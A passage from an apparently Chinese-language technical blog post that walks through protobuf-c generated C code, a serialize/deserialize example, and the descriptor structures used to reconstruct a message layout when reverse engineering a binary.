class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: msg.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not generate deprecated warnings for self */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;msg.pb-c.h&quot;</span></span></span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__init</span></span><br><span class="line">                     <span class="params">(Person         *message)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> Person init_value = PERSON__INIT;</span><br><span class="line">  *message = init_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__get_packed_size</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_get_packed_size ((<span class="type">const</span> ProtobufCMessage*)(message));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span>       *out)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack ((<span class="type">const</span> ProtobufCMessage*)message, out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack_to_buffer</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCBuffer *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="type">const</span> ProtobufCMessage*)message, buffer);</span><br><span class="line">&#125;</span><br><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Person *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;person__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__free_unpacked</span></span><br><span class="line">                     <span class="params">(Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCAllocator *allocator)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(!message)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor person__field_descriptors[<span class="number">3</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT32,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, id),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, name),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, email),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> person__field_indices_by_name[] = &#123;</span><br><span class="line">  <span class="number">2</span>,   <span class="comment">/* field[2] = email */</span></span><br><span class="line">  <span class="number">0</span>,   <span class="comment">/* field[0] = id */</span></span><br><span class="line">  <span class="number">1</span>,   <span class="comment">/* field[1] = name */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCIntRange person__number_ranges[<span class="number">1</span> + <span class="number">1</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">3</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor person__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Person),</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  person__field_descriptors,</span><br><span class="line">  person__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  person__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) person__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>之后如何使用,我们只需要在自己的代码中引入头文件</p><p>然后便能够引用这些符号进行序列化与反序列化了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;msg.pb-c.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    Person person = PERSON__INIT;</span><br><span class="line">    person.id = <span class="number">1234</span>;</span><br><span class="line">    person.name = <span class="string">&quot;John Doe&quot;</span>;</span><br><span class="line">    person.email = <span class="string">&quot;johndoe@example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将消息序列化为字节流</span></span><br><span class="line">    <span class="type">size_t</span> len = person__get_packed_size(&amp;person);</span><br><span class="line">    <span class="type">uint8_t</span> *buffer = <span class="built_in">malloc</span>(len);</span><br><span class="line">    person__pack(&amp;person, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将字节流反序列化为消息</span></span><br><span class="line">    Person *new_person = person__unpack(<span class="literal">NULL</span>, len, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印反序列化后的消息</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ID: %d\n&quot;</span>, new_person-&gt;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, new_person-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Email: %s\n&quot;</span>, new_person-&gt;email);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">    person__free_unpacked(new_person, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>对于逆向我们主要关注unpack这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Person *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;person__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其返回是一个Person指针,所需要的三个参数</p><ul><li>allocator一般不用理会,置0即可</li><li>len是长度,通过<code>person__get_packed_size</code>得到</li><li>data就是指向序列化的字节流</li></ul><p>可以看到<code>person__unpack</code>仅仅是对<code>protobuf_c_message_unpack</code>的封装</p><p>二者之间的差距就在于<code>person__descriptor</code>结构体,其在.c文件中被创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor person__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Person),</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  person__field_descriptors,</span><br><span class="line">  person__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  person__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) person__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/protobuf-c/protobuf-c">protobuf-c/protobuf-c: Protocol Buffers implementation in C (github.com)</a></p><p>查看protobuf-c源码,得到这个结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line"><span class="type">uint32_t</span>magic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"><span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*short_name;</span><br><span class="line"><span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*c_name;</span><br><span class="line"><span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*package_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Size in bytes of the C structure representing an instance of this</span></span><br><span class="line"><span class="comment"> * type of message.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span>sizeof_message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_fields;</span><br><span class="line"><span class="comment">/** Field descriptors, sorted by tag number. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCFieldDescriptor*fields;</span><br><span class="line"><span class="comment">/** Used for looking up fields by name. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span>*fields_sorted_by_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Number of elements in `field_ranges`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_field_ranges;</span><br><span class="line"><span class="comment">/** Used for looking up fields by id. */</span></span><br><span class="line"><span class="type">const</span> ProtobufCIntRange*field_ranges;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Message initialisation function. */</span></span><br><span class="line">ProtobufCMessageInitmessage_init;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved1;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>magic，一般为0x28AAEEF9</li><li>n_fields，关系到原始的message结构内有几条记录、</li><li>fields，这个指向message内所有记录类型组成的一个数组，可以借此逆向分析message结构。</li></ol><p>如果需要具体分析一个结构体的组成,只需要关注n_fields与fields</p><p>在本例中其这样被初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor person__field_descriptors[<span class="number">3</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT32,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, id),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, name),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, email),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>源码中找到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="type">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="type">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>name，名字，变量名</li><li>id，序号，即在message结构体中的顺序（等价于位置）</li><li>label，前面标记的required等标记</li><li>type，数据类型，string还是int64等</li></ol><p>label与type都是枚举类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment"> * more than one).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment"> * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment"> * preserved.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment"> * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><h3 id="ida结构体"><a href="#ida结构体" 